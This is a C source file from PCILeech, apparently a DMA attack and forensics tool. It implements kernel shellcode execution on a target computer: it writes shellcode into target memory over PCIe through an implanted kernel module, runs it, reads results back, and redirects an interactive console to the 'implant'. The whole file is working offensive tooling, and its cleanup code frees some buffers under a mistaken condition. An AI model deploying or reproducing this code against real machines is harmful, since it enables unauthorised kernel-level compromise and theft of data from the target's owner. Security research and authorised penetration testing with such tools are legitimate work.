// executor.c : implementation related 'code execution' and 'console redirect' functionality.
//
// (c) Ulf Frisk, 2016
// Author: Ulf Frisk, pcileech@frizk.net
//
#include "executor.h"
#include "device.h"
#include "util.h"

#define EXEC_IO_MAGIC					0x12651232dfef9521
#define EXEC_IO_CONSOLE_BUFFER_SIZE		0x800
#define EXEC_IO_DMAOFFSET_IS			0x80000
#define EXEC_IO_DMAOFFSET_OS			0x81000
typedef struct tdEXEC_IO {
	QWORD magic;
	struct {
		QWORD cbRead;
		QWORD cbReadAck;
		QWORD Reserved[10];
		BYTE  pb[800];
	} con;
	struct {
		QWORD seq;
		QWORD seqAck;
		QWORD fCompleted;
		QWORD fCompletedAck;
	} bin;
	QWORD Reserved[395];
} EXEC_IO, *PEXEC_IO;

typedef struct tdCONSOLEREDIR_THREADDATA {
	PCONFIG pCfg;
	PDEVICE_DATA pDeviceData;
	HANDLE hThreadIS;
	HANDLE hThreadOS;
	PEXEC_IO pInfoIS;
	PEXEC_IO pInfoOS;
	BYTE pbDataISConsoleBuffer[4096];
	BYTE pbDataOSConsoleBuffer[4096];
} CONSOLEREDIR_THREADDATA, *PCONSOLEREDIR_THREADDATA;

typedef struct tdEXEC_HANDLE {
	PCONFIG pCfg;
	PDEVICE_DATA pDeviceData;
	PKMDDATA pk;
	PBYTE pbDMA;
	HANDLE hFileOutput;
	QWORD qwFileWritten;
	QWORD fError;
	EXEC_IO is;
	EXEC_IO os;
} EXEC_HANDLE, *PEXEC_HANDLE;

// input buffer to targeted console (outgoing info)
// read from this console and send to targeted console
DWORD ConsoleRedirect_ThreadConsoleInput(PCONSOLEREDIR_THREADDATA pd)
{
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	DWORD cbWrite, cbModulo, cbModuloAck;
	while(TRUE) {
		while(pd->pInfoOS->con.cbRead == pd->pInfoIS->con.cbReadAck) {
			Sleep(10);
			continue;
		}
		cbModulo = pd->pInfoOS->con.cbRead % EXEC_IO_CONSOLE_BUFFER_SIZE;
		cbModuloAck = pd->pInfoIS->con.cbReadAck % EXEC_IO_CONSOLE_BUFFER_SIZE;
		if(cbModuloAck < cbModulo) {
			WriteConsoleA(hConsole, pd->pInfoOS->con.pb + cbModuloAck, cbModulo - cbModuloAck, &cbWrite, NULL);
		}
		else {
			WriteConsoleA(hConsole, pd->pInfoOS->con.pb + cbModuloAck, EXEC_IO_CONSOLE_BUFFER_SIZE - cbModuloAck, &cbWrite, NULL);
		}
		pd->pInfoIS->con.cbReadAck += cbWrite;
	}
}

DWORD ConsoleRedirect_ThreadConsoleOutput(PCONSOLEREDIR_THREADDATA pd)
{
	HANDLE hConsoleIn = GetStdHandle(STD_INPUT_HANDLE);
	DWORD cbRead;
	while(TRUE) {
		ReadConsoleA(hConsoleIn, pd->pInfoIS->con.pb + (pd->pInfoIS->con.cbRead % EXEC_IO_CONSOLE_BUFFER_SIZE), 1, &cbRead, NULL);
		pd->pInfoIS->con.cbRead += cbRead;
		while(pd->pInfoIS->con.cbRead - pd->pInfoOS->con.cbReadAck >= EXEC_IO_CONSOLE_BUFFER_SIZE) {
			Sleep(10);
		}
	}
}

BOOL Exec_ConsoleRedirect_Initialize(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _In_ QWORD ConsoleBufferAddr_InputStream, _In_ QWORD ConsoleBufferAddr_OutputStream, _Inout_ PCONSOLEREDIR_THREADDATA pd)
{
	BOOL result;
	pd->pCfg = pCfg;
	pd->pDeviceData = pDeviceData;
	pd->pInfoIS = (PEXEC_IO)pd->pbDataISConsoleBuffer;
	pd->pInfoOS = (PEXEC_IO)pd->pbDataOSConsoleBuffer;
	// read initial buffer and check validity
	result = DeviceReadMEM(pDeviceData, ConsoleBufferAddr_OutputStream, pd->pbDataOSConsoleBuffer, 0x1000, 0);
	if(!result || (pd->pInfoOS->magic != EXEC_IO_MAGIC)) {
		return FALSE;
	}
	// create worker threads
	pd->hThreadIS = CreateThread(NULL, 0, ConsoleRedirect_ThreadConsoleInput, pd, 0, NULL);
	pd->hThreadOS = CreateThread(NULL, 0, ConsoleRedirect_ThreadConsoleOutput, pd, 0, NULL);
	return TRUE;
}

VOID Exec_ConsoleRedirect(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _In_ QWORD ConsoleBufferAddr_InputStream, _In_ QWORD ConsoleBufferAddr_OutputStream)
{
	BOOL result;
	PCONSOLEREDIR_THREADDATA pd = LocalAlloc(LMEM_ZEROINIT, sizeof(CONSOLEREDIR_THREADDATA));
	if(!pd) { return; }
	result = Exec_ConsoleRedirect_Initialize(pCfg, pDeviceData, ConsoleBufferAddr_InputStream, ConsoleBufferAddr_OutputStream, pd);
	if(!result) {
		printf("\nCONSOLE_REDIRECT: Error: Address 0x%016llX does not\ncontain a valid console buffer.\n", ConsoleBufferAddr_OutputStream);
		return;
	}
	// buffer syncer
	while(TRUE) {
		result = DeviceReadMEM(pDeviceData, ConsoleBufferAddr_OutputStream, pd->pbDataOSConsoleBuffer, 0x1000, 0);
		if(!result || pd->pInfoOS->magic != EXEC_IO_MAGIC) {
			printf("\nCONSOLE_REDIRECT: Error: Address 0x%016llX does not\ncontain a valid console buffer.\n", ConsoleBufferAddr_OutputStream);
			return;
		}
		DeviceWriteMEM(pDeviceData, ConsoleBufferAddr_InputStream, pd->pbDataISConsoleBuffer, 0x1000, 0);
	}
	TerminateThread(pd->hThreadIS, 0);
	TerminateThread(pd->hThreadOS, 0);
}

VOID Exec_Callback(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _In_ PKMDDATA pk, _Inout_ PHANDLE phCallback)
{
	BOOL result;
	PEXEC_HANDLE ph = *phCallback;
	DWORD cbLength;
	// initialize if not initialized previously.
	if(!*phCallback) {
		// core initialize
		ph = *phCallback = LocalAlloc(LMEM_ZEROINIT, sizeof(EXEC_HANDLE));
		if(!ph) { return; }
		ph->pbDMA = LocalAlloc(LMEM_ZEROINIT, pk->dataOutExtraLengthMax);
		if(!ph->pbDMA) { LocalFree(ph); *phCallback = NULL; return; }
		ph->pCfg = pCfg;
		ph->pDeviceData = pDeviceData;
		ph->pk = pk;
		ph->is.magic = EXEC_IO_MAGIC;
		// open output file
		ph->hFileOutput = CreateFileA(pCfg->szFileOut, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
		if(!ph->hFileOutput || (ph->hFileOutput == INVALID_HANDLE_VALUE)) {
			ph->hFileOutput = NULL;
			ph->is.bin.fCompletedAck = TRUE;
			DeviceWriteDMA(pDeviceData, pk->DMAAddrPhysical + EXEC_IO_DMAOFFSET_IS, (PBYTE)&ph->is, 0x1000, 0);
			ph->fError = TRUE;
			printf("EXEC: Failed writing large outut to file: %s\n", ph->pCfg->szFileOut);
			return;
		}
		printf("EXEC: Start writing large output to file: %s\n", ph->pCfg->szFileOut);
	}
	// write to output file and ack to buffer
	if(ph->is.bin.fCompletedAck) { return; }
	DeviceReadDMA(pDeviceData, ph->pk->DMAAddrPhysical + EXEC_IO_DMAOFFSET_OS, (PBYTE)&ph->os, 0x1000, 0);
	if(ph->os.magic != EXEC_IO_MAGIC) { return; }
	if(ph->is.bin.seqAck >= ph->os.bin.seq) { return; }
	cbLength = 0;
	result =
		DeviceReadDMA(pDeviceData, ph->pk->DMAAddrPhysical + ph->pk->dataOutExtraOffset, ph->pbDMA, (DWORD)SIZE_PAGE_ALIGN_4K(ph->pk->dataOutExtraLength), 0) &&
		WriteFile(ph->hFileOutput, ph->pbDMA, (DWORD)ph->pk->dataOutExtraLength, &cbLength, NULL) &&
		(ph->pk->dataOutExtraLength == cbLength);
	ph->qwFileWritten += cbLength;
	ph->fError = !result;
	ph->is.bin.fCompletedAck = ph->is.bin.fCompletedAck || ph->os.bin.fCompleted || !result;
	ph->is.bin.seqAck = ph->os.bin.seq;
	DeviceWriteDMA(pDeviceData, pk->DMAAddrPhysical + EXEC_IO_DMAOFFSET_IS, (PBYTE)&ph->is, 0x1000, 0);
}

VOID Exec_CallbackClose(_In_ HANDLE hCallback)
{
	PEXEC_HANDLE ph = hCallback;
	if(hCallback == NULL) { return; }
	if(ph->hFileOutput) {
		if(ph->fError) {
			printf("EXEC: Failed writing large outut to file: %s\n", ph->pCfg->szFileOut);
		} else {
			printf("EXEC: Successfully wrote %i bytes.\n", ph->qwFileWritten);
		}
	}
	if(ph->hFileOutput) { CloseHandle(ph->hFileOutput); }
	LocalFree(ph->pbDMA);
	LocalFree(ph);
}

VOID ActionExecShellcode(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
{
	const DWORD CONFIG_SHELLCODE_MAX_BYTES_OUT_PRINT = 8192;
	BOOL result;
	PKMDEXEC pKmdExec = NULL;
	PBYTE pbBuffer = NULL;
	BYTE pbZeroPage2[0x2000] = { 0 };
	PSTR szBufferText = NULL;
	DWORD cbBufferText, cbLength;
	HANDLE hFile = NULL;
	PKMDDATA pk;
	//------------------------------------------------ 
	// 1: Setup and initial validity checks.
	//------------------------------------------------
	if(!pDeviceData->KMDHandle) {
		printf("EXEC: Failed. Retrieving page info requires an active kernel module (KMD). Please use in conjunction with the -kmd option only.\n");
		goto fail;
	}
	pk = ((PKMDHANDLE)pDeviceData->KMDHandle)->status;
	if(pk->DMASizeBuffer < 0x084000 + 0x100000 + min(0x100000, SIZE_PAGE_ALIGN_4K(pCfg->cbIn))) {
		printf("EXEC: Failed. DMA buffer is too small / input size exceeded.\n");
		goto fail;
	}
	//------------------------------------------------ 
	// 2: Load KMD shellcode and commit to target memory.
	//------------------------------------------------
	result = Util_LoadKmdExecShellcode(pCfg->szShellcodeName, &pKmdExec);
	if(!result) {
		printf("EXEC: Failed loading shellcode from file: '%s.ksh' ...\n", pCfg->szShellcodeName);
		goto fail;
	}
	result = DeviceWriteDMAVerify(pDeviceData, pk->DMAAddrPhysical, pKmdExec->pbShellcode, (DWORD)pKmdExec->cbShellcode, PCILEECH_MEM_FLAG_RETRYONFAIL);
	if(!result) {
		printf("EXEC: Failed writing shellcode to target memory.\n");
		goto fail;
	}
	//------------------------------------------------ 
	// 3: Set up indata and write to target memory.
	//    Memory layout of DMA buffer:
	//    [0x000000, 0x080000[ = shellcode
	//    [0x080000          ] = (shellcode initiated com buffer for console and data transfer (input  to   implant) [IS])
	//    [0x081000          ] = (shellcode initiated com buffer for console and data transfer (output from implant) [OS])
	//    [0x082000, X       [ = data in (to target computer); X = max(0x100000, cb_in)
	//    [X       , buf_max [ = data out (from target computer)
	//------------------------------------------------
	DeviceWriteDMA(pDeviceData, pk->DMAAddrPhysical + 0x080000, pbZeroPage2, 0x2000, 0);
	pk->dataInExtraOffset = 0x082000;
	pk->dataInExtraLength = pCfg->cbIn;
	pk->dataInExtraLengthMax = max(0x100000, SIZE_PAGE_ALIGN_4K(pCfg->cbIn));
	pk->dataOutExtraOffset = pk->dataInExtraOffset + pk->dataInExtraLengthMax;
	pk->dataOutExtraLength = 0;
	pk->dataOutExtraLengthMax = pk->DMASizeBuffer - pk->dataOutExtraOffset;
	memcpy(pk->dataIn, pCfg->qwDataIn, sizeof(QWORD) * 10);
	memcpy(pk->dataInStr, pCfg->szInS, MAX_PATH);
	memset(pk->dataOut, 0, sizeof(QWORD) * 10);
	memset(pk->dataOutStr, 0, MAX_PATH);
	if(pCfg->cbIn) {
		result = DeviceWriteDMA(pDeviceData, pk->DMAAddrPhysical + pk->dataInExtraOffset, pCfg->pbIn, (DWORD)SIZE_PAGE_ALIGN_4K(pCfg->cbIn), 0);
		if(!result) {
			printf("EXEC: Failed writing data to target memory.\n");
			goto fail;
		}
	}
	pk->dataInConsoleBuffer = 0;
	pk->dataOutConsoleBuffer = 0;
	//------------------------------------------------ 
	// 4: Execute! and display result.
	//------------------------------------------------
	KMD_SubmitCommand(pCfg, pDeviceData, pDeviceData->KMDHandle, KMD_CMD_VOID);
	result = KMD_SubmitCommand(pCfg, pDeviceData, pDeviceData->KMDHandle, KMD_CMD_EXEC);
	if(!result) {
		printf("EXEC: Failed sending execute command to KMD.\n");
		goto fail;
	}
	printf("EXEC: SUCCESS! shellcode should now execute in kernel!\nPlease see below for results.\n\n");
	printf(pKmdExec->szOutFormatPrintf,
		pk->dataOutStr,
		pk->dataOut[0],
		pk->dataOut[1],
		pk->dataOut[2],
		pk->dataOut[3],
		pk->dataOut[4],
		pk->dataOut[5],
		pk->dataOut[6],
		pk->dataOut[7],
		pk->dataOut[8],
		pk->dataOut[9]);
	//------------------------------------------------ 
	// 5: Display/Write additional output.
	//------------------------------------------------
	cbLength = (DWORD)pk->dataOutExtraLength;
	if(cbLength > 0) {
		// read extra output buffer
		if(!(pbBuffer = LocalAlloc(LMEM_ZEROINIT, SIZE_PAGE_ALIGN_4K(cbLength))) ||
			!DeviceReadDMA(pDeviceData, pk->DMAAddrPhysical + pk->dataOutExtraOffset, pbBuffer, SIZE_PAGE_ALIGN_4K(cbLength), 0)) {
			printf("EXEC: Error reading output.\n");
			goto fail;
		}
		// print to screen
		if(cbLength > CONFIG_SHELLCODE_MAX_BYTES_OUT_PRINT) {
			printf("EXEC: Large output. Only displaying first %i bytes.\n", CONFIG_SHELLCODE_MAX_BYTES_OUT_PRINT);
		}
		if(CryptBinaryToStringA(pbBuffer, min(CONFIG_SHELLCODE_MAX_BYTES_OUT_PRINT, cbLength), CRYPT_STRING_HEXASCIIADDR, NULL, &cbBufferText) &&
			(szBufferText = (LPSTR)LocalAlloc(LMEM_ZEROINIT, cbBufferText)) &&
			CryptBinaryToStringA(pbBuffer, min(CONFIG_SHELLCODE_MAX_BYTES_OUT_PRINT, cbLength), CRYPT_STRING_HEXASCIIADDR, szBufferText, &cbBufferText)) {
			printf("%s\n", szBufferText);
		}
		// write to out file
		if(pCfg->szFileOut[0]) {
			hFile = CreateFileA(pCfg->szFileOut, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
			if(!hFile || (hFile == INVALID_HANDLE_VALUE)) {
				printf("EXEC: Error writing output to file.\n");
				goto fail;
			}
			if(!WriteFile(hFile, pbBuffer, cbLength, &cbLength, NULL)) {
				printf("EXEC: Error writing output to file.\n");
				goto fail;
			}
			printf("EXEC: Wrote %i bytes to file %s.\n", cbLength, pCfg->szFileOut);
		}
	}
	//----------------------------------------------------------
	// 6: Call the post execution console redirection if needed.
	//----------------------------------------------------------
	if(pk->dataInConsoleBuffer || pk->dataOutConsoleBuffer) {
		Exec_ConsoleRedirect(pCfg, pDeviceData, pk->dataInConsoleBuffer, pk->dataOutConsoleBuffer);
	}
	printf("\n");
fail:
	if(szBufferText) { LocalFree(pKmdExec); }
	if(szBufferText) { LocalFree(pbBuffer); }
	if(szBufferText) { LocalFree(szBufferText); }
	if(hFile) { CloseHandle(hFile); }
}
